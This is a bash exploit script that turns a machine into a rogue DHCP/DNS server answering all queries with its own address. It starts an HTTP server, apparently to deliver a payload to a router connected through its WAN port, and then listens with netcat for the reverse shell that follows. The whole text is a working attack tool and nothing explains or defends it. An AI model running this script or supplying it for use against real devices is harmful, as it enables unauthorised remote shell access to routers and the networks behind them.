#!/bin/bash
HOLE_ADDR=192.168.99.1
START_ADDR=192.168.99.100
END_ADDR=192.168.99.200

if [ -z $1 ]; then
	echo "Usage: $0 <network_interface>"
	echo "Example: $0 eth0"
	exit 1
fi

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root."
   exit 1
fi

INTERFACE="$1"
echo "[*] Starting exploit on network interface ${INTERFACE} (the one plugged to the WAN port of the router)"

# 0. Setup the network interface
ip link set dev ${INTERFACE} down
ip addr flush dev ${INTERFACE} 
ip addr add ${HOLE_ADDR}/24 dev ${INTERFACE}
ip link set dev ${INTERFACE} up

# Dirty hack to get current terminal :D
NEWTERM=$(perl -lpe 's/\0/ /g' /proc/$(xdotool getwindowpid $(xdotool getactivewindow))/cmdline)

# 1. Start DHCP/DNS server
${NEWTERM} -e bash -c "dnsmasq -h -d -q -i ${INTERFACE} -R -C /dev/null -a ${HOLE_ADDR} -A /#/${HOLE_ADDR} -F${START_ADDR},${END_ADDR} -l leases.log -K ; sleep 1000" &
# 2. Start HTTP server
${NEWTERM} -e bash -c "python3 $(pwd)/http/server.py --ip ${HOLE_ADDR} ; sleep 1000" &
# 3. Wait for reverse shell
echo "Waiting for remote shell..."
nc -lvnp 4242

